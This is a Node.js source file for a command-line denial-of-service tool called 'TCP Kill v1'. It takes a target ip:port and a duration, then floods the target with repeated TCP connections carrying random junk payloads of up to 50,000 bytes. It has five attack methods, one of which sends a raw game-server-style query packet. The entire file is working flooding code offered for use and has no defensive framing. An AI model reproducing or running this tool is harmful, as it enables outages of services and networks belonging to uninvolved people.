var net = require('net');

if (process.argv.length <= 4) {
	console.log("TCP Kill v1 | ServerSide");
	console.log("Usage: node tcp_kill.js <method> <ip:port> <time>");
	process.exit(-1);
}

var method = process.argv[2];
var target = process.argv[3].split(':');

var host = target[0];
var port = parseInt(target[1]);
var time = parseInt(process.argv[4]);


function makeid(length) {
    var result           = '';
    var characters       = '!@#$%^&**()_+-={}:;"<>?/.,ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
      result += characters.charAt(Math.floor(Math.random() * 
 charactersLength));
   }
   return result;
}


if (method == "connect"){
	console.log("TCP Kill v1 | ServerSide");
	console.log("Target: " + host + ":" + port);
	console.log("Method: connect");
	console.log("Time: " + time);
	console.log("Attack started");
	var int = setInterval(() => {
    var client = new net.Socket();
	client.connect(port, host, function() {
	client.destroy();
	});
		client.on('data', function () {
        setTimeout(function () {
            client.destroy();
            return delete client;
        }, 5000);
    })
	});
	setTimeout(() => clearInterval(int), time * 1000);
}

if (method == "all"){
	console.log("TCP Kill v1 | ServerSide");
	console.log("Target: " + host + ":" + port);
	console.log("Method: all");
	console.log("Time: " + time);
	console.log("Attack started");
	var int = setInterval(() => {
    var client = new net.Socket();
	client.connect(port, host, function() {
		for (var i = 0; i < 5; i++) {
			client.write(makeid(1000));
    	}
    	client.write(makeid(50000));
	client.destroy();
	});
		client.on('data', function () {
        setTimeout(function () {
            client.destroy();
            return delete client;
        }, 5000);
    })
	});
	setTimeout(() => clearInterval(int), time * 1000);
}

if (method == "byte"){
	console.log("TCP Kill v1 | ServerSide");
	console.log("Target: " + host + ":" + port);
	console.log("Method: byte");
	console.log("Time: " + time);
	console.log("Attack started");
	var int = setInterval(() => {
	var client = new net.Socket();
	client.connect(port, host, function() {
		client.setTimeout(10000)
		for (var i = 0; i < 5; i++) {
			client.write(makeid(1000));
    	}
		client.destroy();
	});
	client.on('data', function () {
        setTimeout(function () {
            client.destroy();
            return delete client;
        }, 5000);
    })
	});
	setTimeout(() => clearInterval(int), time * 1000);
}


if (method == "vse"){
	console.log("TCP Kill v1 | ServerSide");
	console.log("Target: " + host + ":" + port);
	console.log("Method: vse");
	console.log("Time: " + time);
	console.log("Attack started");
	var int = setInterval(() => {
	var client = new net.Socket();
	client.connect(port, host, function() {
		client.setTimeout(10000)
		client.write('\x06\x00/\x00\x00\x00\x02\x0c\x00');
		client.destroy();
	});
	client.on('data', function () {
        setTimeout(function () {
            client.destroy();
            return delete client;
        }, 5000);
    })
	});
	setTimeout(() => clearInterval(int), time * 1000);
}


if (method == "big"){
	console.log("TCP Kill v1 | ServerSide");
	console.log("Target: " + host + ":" + port);
	console.log("Method: big");
	console.log("Time: " + time);
	console.log("Attack started");
	var int = setInterval(() => {
	var client = new net.Socket();
	client.connect(port, host, function() {
		client.setTimeout(10000)
			client.write(makeid(50000));
    	
		client.destroy();
	});
	client.on('data', function () {
        setTimeout(function () {
            client.destroy();
            return delete client;
        }, 5000);
    })
	});
	setTimeout(() => clearInterval(int), time * 1000);
}
